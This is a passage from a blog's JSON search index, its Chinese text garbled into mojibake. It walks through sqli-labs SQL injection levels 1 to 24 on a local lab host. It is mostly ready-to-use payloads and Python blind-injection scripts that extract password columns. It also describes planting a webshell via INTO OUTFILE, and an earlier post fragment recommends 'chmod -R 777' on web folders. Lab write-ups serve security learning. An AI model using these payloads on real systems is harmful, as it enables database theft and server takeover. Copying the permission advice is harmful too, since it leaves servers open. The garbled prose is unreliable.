Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored å°†mysqlæ–‡ä»¶å¤¹ä¸­çš„my.cnfçš„æƒé™æ”¹ä¸º 644 chmon 644 my.cnf ç½‘ç«™çš„å›¾ç‰‡æ— æ³•æ˜¾ç¤ºæˆ–è€…css,jsä»£ç æ— æ³•æ‰§è¡Œ è¿›å…¥nginxæœåŠ¡å™¨çš„å®¹å™¨å†… docker exec -it å®¹å™¨å bash cd è¿›å…¥å›¾ç‰‡æˆ–è€…css jsä»£ç ä¿å­˜çš„æ–‡ä»¶å¤¹ ä½¿ç”¨chmodæ”¹å˜æƒé™ chmod -R 777 æ–‡ä»¶å¤¹ # -R å‚æ•°æ˜¯é€’å½’æ”¹å˜æƒé™ å³æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶éƒ½æœ‰777 çš„æƒé™ æ€»ç»“ æé«˜äº†è‡ªå·±çš„åŠ¨æ‰‹èƒ½åŠ›ï¼Œä»¥åŠç¼–ç¨‹èƒ½åŠ›ï¼ŒåŠ æ·±äº†å¯¹thinkPHPæ¡†æ¶çš„äº†è§£ï¼Œæ˜ç™½äº†å…¶è¿è¡ŒåŸç†ï¼Œå­¦ä¼šäº†å¦‚ä½•ç¼–è¾‘ä¸€ä¸ªCMSç½‘ç«™ åœ¨ç¼–å†™æ¼æ´çš„è¿‡ç¨‹ä¸­ä¹Ÿæé«˜äº†è‡ªå·±å¯¹æ”¹æ¼æ´çš„ç†è§£ï¼Œåœ¨ä»¥åçš„å­¦ä¹ å’Œå·¥ä½œä¸­èƒ½æ›´å¥½çš„åˆ©ç”¨å’Œé˜²å¾¡æ¼æ´ é”»ç‚¼äº†è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›ï¼Œä»ä¸€å¼€å§‹çš„æ— ä»ä¸‹æ‰‹ï¼Œåæ¥é€šè¿‡æ‰‹å†Œå­¦ä¹ åï¼Œäº†è§£äº†ç½‘ç«™çš„æ¡†æ¶ï¼Œåˆ°åæ¥å¯ä»¥è‡ªå¦‚çš„ä¿®æ”¹ç½‘ç«™çš„é¡µé¢å’Œåç«¯é€»è¾‘ä»£ç ï¼Œå¯¹è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›æå‡å¾ˆå¤§ï¼Œè¿™ä¹Ÿæ˜¯è¿™é—¨è¯¾ç¨‹çš„é‡è¦æ„ä¹‰ã€‚æ¯•ç«Ÿå­¦ä¹ å®‰å…¨ï¼Œå¾ˆå¤šä¸œè¥¿æ˜¯éœ€è¦è‡ªå·±æ‘¸ç´¢çš„ï¼Œå…·å¤‡ç‹¬ç«‹å­¦ä¹ çš„èƒ½åŠ›æ‰èƒ½åœ¨å®‰å…¨çš„é“è·¯ä¸Šèµ°çš„æ›´è¿œã€‚","tags":[{"name":"thinkPHP,cms","slug":"thinkPHP-cms","permalink":"https://sunzhengyu99.github.io/tags/thinkPHP-cms/"}]},{"title":"net_a_and_d","date":"2021-03-03T07:09:54.000Z","path":"2021/03/03/net-a-and-d/","text":"[TOC] sqlæ³¨å…¥level1getæäº¤å‚æ•°id é¦–å…ˆæäº¤1&#39;ï¼Œåˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ è¿™é‡Œå‡ºç°æŠ¥é”™ï¼Œè¯´æ˜æ˜¯å­—ç¬¦ç±»å‹çš„ï¼Œå¹¶ä¸”æ˜¯ç”¨&#39;å°†å‚æ•°idåŒ…è£¹èµ·æ¥çš„ã€‚ æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­åˆ—æ•°ï¼Œçˆ†è¡¨åï¼Œçˆ†åˆ—åå’Œæ•°æ®åº“å†…å®¹ 0x1 ç¡®å®šåˆ—æ•°å¹¶çˆ†å‡ºè¡¨å å½“åˆ—æ•°å¢åŠ åˆ°4çš„æ—¶å€™å¼€å§‹æŠ¥é”™ï¼Œè¯´æ˜æ˜¯ä¸‰åˆ— ?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 0x2 çˆ†åˆ—å ?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ è¿™é‡Œçš„åˆ—åå¾ˆå¤š user_id,first_name,last_name,user,password,avatar,last_login,failed_login 0x3 çˆ†å‡ºå†…å®¹ é€‰æ‹©password ?id=-1&#x27; union select 1,group_concat(password),3 from users--+ level2åŒæ ·ä½¿ç”¨ id=1&#39;ï¼Œåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„æ³¨å…¥ å¯ä»¥å‘ç°è¾“å…¥çš„&#39;æ²¡æœ‰å…¶ä»–çš„&#39;ä¸ä¹‹é—­åˆï¼Œå¯¼è‡´æŠ¥é”™ï¼Œæ‰€ä»¥è¿™æ˜¯æ•°å­—å‹æ³¨å…¥ æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨level1çš„æ³¨å…¥è¯­å¥ï¼Œåªéœ€è¦åˆ é™¤ â€˜ å³å¯ ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1 union select 1,group_concat(password),3 from users--+ level3æäº¤id=1&#39; åˆ†æä¸€ä¸‹æŠ¥é”™åŸå›  å‡ºé”™çš„è¯­å¥ä¸º &#x27;1&#x27;&#x27;) LIMIT 0,1 å…¶ä¸­1â€™è¾“å…¥çš„å†…å®¹ï¼Œæ‰€ä»¥åŒ…è£¹å‚æ•°çš„æ ¼å¼ä¸º(&#39;id&#39;) æ³¨å…¥è¯­å¥å¯ä»¥ç›´æ¥åœ¨level1çš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ª )å³å¯ å°†åŸè¯­å¥ä¿®æ”¹ä¸º &#x27;1&#x27;) æ³¨å…¥è¯­å¥ --+ &#x27;) LIMIT 0,1 ?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1&#x27;) union select 1,group_concat(password),3 from users--+ level4åŒæ ·è¾“å…¥id=1&#39;ï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰æŠ¥é”™ï¼Œæ‰æ˜¯æ˜¯ä½¿ç”¨äº†&quot;ï¼Œæ¢æˆid=1&quot; å¾ˆæ˜æ˜¾å’Œlevel3åŸºæœ¬ç›¸åŒï¼Œå°†&#39;æ”¹ä¸º&quot;ï¼Œå°±æ˜¯è¿™å…³çš„ç­”æ¡ˆ level5è¿™é¢˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯ä¸åœ¨å›æ˜¾æ‰€æŸ¥è¯¢çš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¯ç›²æ³¨ æŸ¥çœ‹æºç ä¹Ÿå¯ä»¥å‘ç° ä¸åœ¨æ‰“å°å‡ºæ‰€æŸ¥è¯¢åˆ°çš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¯ç›²æ³¨ï¼Œä½†æ˜¯è¿™å…³æ²¡æœ‰å…³é—­æŠ¥é”™å›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥ (1). é€šè¿‡flooræŠ¥é”™ and (select 1 from (select count(),concat((payload) from users limit 0,1),floor (rand(0)2))x from information_schema.tables group by x)a) å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°† è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º64ä¸ªå­—ç¬¦ (2). é€šè¿‡updatexmlæŠ¥é”™ and updatexml(1,payload,1) åŒæ ·è¯¥è¯­å¥å¯¹è¾“å‡ºçš„å­—ç¬¦é•¿åº¦ä¹Ÿåšäº†é™åˆ¶ï¼Œå…¶æœ€é•¿è¾“å‡º32ä½å¹¶ä¸”è¯¥è¯­å¥å¯¹payloadçš„åæ‚”ç±»å‹ä¹Ÿåšäº†é™åˆ¶ï¼Œåªæœ‰åœ¨payloadè¿”å›çš„ä¸æ˜¯xmlæ ¼å¼æ‰ä¼šç”Ÿæ•ˆ (3). é€šè¿‡ExtractValueæŠ¥é”™ and extractvalue(1, payload) è¾“å‡ºå­—ç¬¦æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿32ä½ã€‚ 0x1 ç¡®å®šæ•°æ®åº“å ?id=1&#x27; and extractvalue(1,concat(0x23,database(),0x23))--+ 0x2 çˆ†è¡¨å ?id=1&#x27; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x23))--+ è¿™é‡Œæ¯æ¬¡æŠ¥é”™æ˜¾ç¤ºçš„ä¿¡æ¯åªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥åªèƒ½æœ‰ limitï¼Œä¸€ä¸ªä¸€ä¸ªçš„æ˜¾ç¤ºï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡è¡¨å 0x3 çˆ†åˆ—å ?id=1&#x27; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),0x23))--+ 0x4 çˆ†å†…å®¹ ?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+ åé¢çš„å†…å®¹å¯ä»¥é€šè¿‡æ”¹å˜limitåçš„ç¬¬ä¸€ä¸ªå‚æ•°æŸ¥çœ‹ level6ä¸level5å¾ˆåƒ ä½†æ˜¯è¿™é‡Œæ˜¯ç”¨ â€œåŒ…è£¹å‚æ•°ï¼Œæ‰€ä»¥åªéœ€è¦å°†ä¸Šé¢çš„æ³¨å…¥è¯­å¥ä¸­çš„ â€˜ æ”¹ä¸º â€œå³å¯ level7æäº¤id=1ï¼Œå‡ºç°æç¤º éœ€è¦ä½¿ç”¨outfileå‡½æ•° åœ¨åˆ©ç”¨sqlæ³¨å…¥æ¼æ´åæœŸï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯é€šè¿‡mysqlçš„fileç³»åˆ—å‡½æ•°æ¥è¿›è¡Œè¯»å–æ•æ„Ÿæ–‡ä»¶æˆ–è€…å†™å…¥webshellï¼Œå…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°æœ‰ä»¥ä¸‹ä¸‰ä¸ª into dumpfile() into outfile() load_file() è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨outfileå‡½æ•° é¦–å…ˆç¡®å®šè¿™å…³åŒ…è£¹å‚æ•°çš„æ ¼å¼ ä¸€ç›´æµ‹è¯•åˆ°id=1&#39;)) --+ï¼Œæ‰æ˜¾ç¤ºæ­£ç¡®æ‰€ä»¥å¯ä»¥ç¡®å®šå‚æ•°çš„åŒ…è£¹æ ¼å¼ä¸º((&#39;id&#39;)) 0x1 å‘ç½‘ç«™æ ¹ç›®å½•å†™å…¥ä¸€å¥è¯æœ¨é©¬ æ‰§è¡Œåå°±å¯ä»¥åœ¨æ ¹ç›®å½•ä¸­çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ 0x2 ä½¿ç”¨èšå‰‘è¿æ¥ 127.0.0.1/3.php å¯†ç :cmd level8æ ¹æ®æ ‡é¢˜å’Œæµ‹è¯•ç»“æœå¯ä»¥çœ‹å‡ºæ˜¯ç›²æ³¨ é¦–å…ˆåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹æ³¨å…¥ æäº¤id=1ï¼Œæ˜¾ç¤ºç»“æœä¸ºYou are inï¼Œå¯ä»¥ç¡®å®šæˆåŠŸæŸ¥è¯¢è¿”å›çš„ç»“æœ æäº¤id=1&#39;ï¼Œæ²¡æœ‰æç¤ºYou are inï¼Œä½†æ˜¯æäº¤id=1&#39; --+ï¼Œå†æ¬¡å‡ºç°You are inï¼Œå¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼ŒåŒ…è£¹å½¢å¼ä¸º&#39;id&#39; æ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šç›²æ³¨ä½¿ç”¨çš„è¯­å¥ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ asciiå’Œsubstringä¸¤ä¸ªå‡½æ•° 0x1 çˆ†å‡ºæ•°æ®åº“å ?id=1&#x27; and ascii(substring(database(),1,1))&gt;97%23 é¦–å…ˆå‡è®¾æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç å€¼å¤§äº97ï¼Œå›æ˜¾ä¸ºyou are inï¼Œæ‰€ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—æ¯å¤§äº97ï¼Œä¹‹åå¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•ç¡®å®šå‡ºæœ€åçš„å­—æ¯ã€‚ å¯ä»¥ä½¿ç”¨è„šæœ¬å®Œæˆè¯¥è¿‡ç¨‹ï¼Œè„šæœ¬è·‘å‡ºçš„ç»“æœä¸º security 0x2 çˆ†å‡ºè¡¨å ä½¿ç”¨æ³¨å…¥è¯­å¥ id=1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23 æœ€åçˆ†å‡ºçš„è¡¨åå¦‚ä¸‹ 0x3 çˆ†å‡ºåˆ—å id=1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23 0x4 çˆ†å‡ºå†…å®¹ id=1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23 å®Œæ•´è„šæœ¬å¦‚ä¸‹ import requests url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;You are in&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level9é¢˜ç›®æ ‡é¢˜æç¤ºäº†æ˜¯åŸºäºæ—¶é—´ä¸”å•å¼•å·é—­åˆçš„ç›²æ³¨ åŸºäºæ—¶é—´çš„ç›²æ³¨éœ€è¦ä½¿ç”¨åˆ°sleepå‡½æ•°ï¼ŒåŸºæœ¬ç”¨æ³•å¦‚ä¸‹ åˆ†åˆ«æäº¤id=1ï¼Œid=1&#39; and sleep(3) --+ï¼Œå…¶æœåŠ¡å™¨çš„å“åº”æ—¶é—´å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªçš„å“åº”æ—¶é—´æ­£å¥½æ¯”ç¬¬ä¸€ä¸ªé•¿äº†ä¸‰ç§’ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­è‡ªå·±æ‰€æŸ¥è¯¢çš„è¯­å¥æ˜¯å¦æ­£ç¡®ï¼Œä¸€èˆ¬éœ€è¦ç¼–å†™è„šæœ¬å®Œæˆæ‰€æœ‰æ­¥éª¤ã€‚ æ³¨å…¥è„šæœ¬åªéœ€è¦æ”¹ä¸€æ”¹level8çš„å³å¯ã€‚ å®Œæ•´è„šæœ¬å¦‚ä¸‹ import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) çˆ†ç ´æ•°æ®åº“åçš„è¿‡ç¨‹å¦‚ä¸‹ level10ä¸level9åŸºæœ¬ç›¸åŒï¼Œåªéœ€è¦å°†payloadä¸­çš„&#39;æ¢æˆ&quot;å³å¯ å®Œæ•´è„šæœ¬å¦‚ä¸‹ import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&quot; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) level11æ‰“å¼€ç½‘é¡µæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ å…ˆåˆ¤æ–­åˆ—æ•°ï¼Œå½“ä¸‰åˆ—å‡ºç°æŠ¥é”™ï¼Œè¯´æ˜åªæœ‰ä¸¤åˆ— uname=admin&#x27; order by 2#&amp;passwd=1&amp;submit=Submit å°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼ŒæˆåŠŸç™»å½• uname=admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #&amp;passwd=1&amp;submit=Submit è·å–æ•°æ®åº“ uname=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)##&amp;passwd=1&amp;submit=Submit è·å–åˆ—åï¼Œå­—æ®µå uname=sda&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&#x27; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level12è¿™ä¸€å…³ä¸ä¸Šé¢å°±æ˜¯ä½¿ç”¨çš„é—­åˆç¬¦å·ä¸åŒï¼Œä½¿ç”¨çš„åŒå¼•å·ï¼Œæ‰€ä»¥åªè¦å°†ä¸Šé¢çš„payloadæ”¹ä¸€ä¸‹å³å¯ uname=sda&quot; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&quot; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level13è¾“å…¥å•å¼•å·ï¼Œå‡ºç°æŠ¥é”™ åˆ†æä¸€ä¸‹å³å¯ &#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1 ç¬¬äºŒä¸ª&#39;æ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼Œæ‰€ä»¥é—­åˆæ–¹å¼ä¸º&#39;) ä½†æ˜¯è¿™é¢˜æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å»¶æ—¶ç›²æ³¨ æ³¨å…¥çš„payload uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit level14è¿™ä¸€å…³å°±æ˜¯å’Œä¸Šé¢çš„é—­åˆæ–¹å¼ä¸ä¸€æ ·ï¼Œç¨åŠ ä¿®æ”¹å³å¯ uname= sad&quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit level15è¿™æ˜¯å•å¼•å·é—­åˆçš„å¸ƒå°”ç›²æ³¨ï¼ŒPOSTå‹ åˆ¤æ–­ä¾æ®å¯ä»¥æ ¹æ®é¡µé¢å‡ºç°çš„å›¾ç‰‡ ç™»å½•ä¸æˆåŠŸæ—¶å‡ºç°çš„å›¾ç‰‡ ç™»å½•æˆåŠŸçš„å›¾ç‰‡ è¿™é‡Œä½¿ç”¨æ—¶é—´ç›²æ³¨ # -*- coding = utf - 8 -*- #@Time : 2021/4/21 19:54 #@Author : sunzy #@File : level15.py import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-15/&quot; flag = &quot;&quot; data = &#123;&#x27;uname&#x27;:&#x27;admin&#x27;,&#x27;passwd&#x27;:&#x27;sad&#x27;,&#x27;submit&#x27;:&#x27;Submit&#x27;&#125; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) #payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;.format(i,mid) t1 = datetime.datetime.now() data[&#x27;uname&#x27;] = payload response = requests.post(url=url,data=data) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 5: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(flag) flag = flag + chr(mid) print(flag) print(flag) level16å°†ä¸Šä¸€å…³çš„è„šæœ¬è¯¥ç»™åŒå¼•å·é—­åˆå³å¯ level17updataæ³¨å…¥ å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select database())),1)#&amp;submit=Submit level18unameå’Œpasswdéƒ½ä½¿ç”¨check_inputè¿‡æ»¤ï¼Œè€Œåœ¨è¿™é‡Œå°†user-agentå’Œipä½œä¸ºè®°å½•ï¼Œæ’å…¥æ•°æ®åº“ æç¤ºäº†ipåœ°å€å’Œuser-Agentï¼Œåº”è¯¥æ—¶httpå¤´æ³¨å…¥ æŠ“åŒ…åï¼Œåœ¨user-agentçš„ä½ç½®æ’å…¥æ³¨å…¥è¯­å¥ 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level19 ç™»å½•åæç¤ºäº†refererï¼Œåº”è¯¥æ˜¯åœ¨refererå¤´æ³¨å…¥ 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level20æ­£å¸¸ç™»å½•ï¼Œå‘ç°ä¸€ä¸ªcookieå­—æ®µ å°è¯•cookieä½ç½®æ³¨å…¥ è¿™é‡Œç›´æ¥ä½¿ç”¨unionè”åˆæŸ¥è¯¢å³å¯ uname=-adm&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# uname=-ada&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;# uname=-ada&#x27; union select 1,group_concat(password),3 from users# level21è¿™ä¸€å…³å’Œä¸Šä¸€å…³å°±æ˜¯åŠ äº†ä¸€å±‚base64ç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„æ³¨å…¥ç¼–ç åæäº¤ uname=-as&#x27; union select 1,2,3# uname=LWFzJyB1bmlvbiBzZWxlY3QgMSwyLDMj ä½†æ˜¯å‡ºç°æŠ¥é”™ uname=-as&#x27;) union select 1,2,3# uname=LWFzJykgdW5pb24gc2VsZWN0IDEsMiwzIw== æ‰€ä»¥åªè¦å°†ä¸Šé¢çš„sqlè¯­å¥ä¿®æ”¹é—­åˆæ–¹å¼å†ç¼–ç æäº¤å³å¯ level22åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥ è¿™é‡Œåªè¦å°†21å…³çš„åŒå¼•å·æ¢æˆåŒå¼•å·ï¼Œå†base64ç¼–ç  uname=-as&quot; union select 1,2,3# uname=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj uname=-ada&#x27; union select 1,group_concat(password),3 from users--+ uname=LWFkYSIgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSwzIGZyb20gdXNlcnMj level23æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“æ˜¯getå‹æ³¨å…¥ ä½†æ˜¯ä½†è¾“å…¥ 2&#x27; or 1=1 # 2&#x27; or 1=1 --+ 2&#x27; or 1=1 %23 éƒ½ä¼šå‡ºç°è¯­æ³•é”™è¯¯ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ #, --ä¸¤ä¸ªæ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº† é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„æ³¨é‡Šç¬¦ï¼š;%00æˆ–è€…andå’Œorè¯­å¥è¿›è¡Œé—­åˆ payload: ?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users ;%00 level24äºŒæ¬¡æ³¨å…¥ äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ 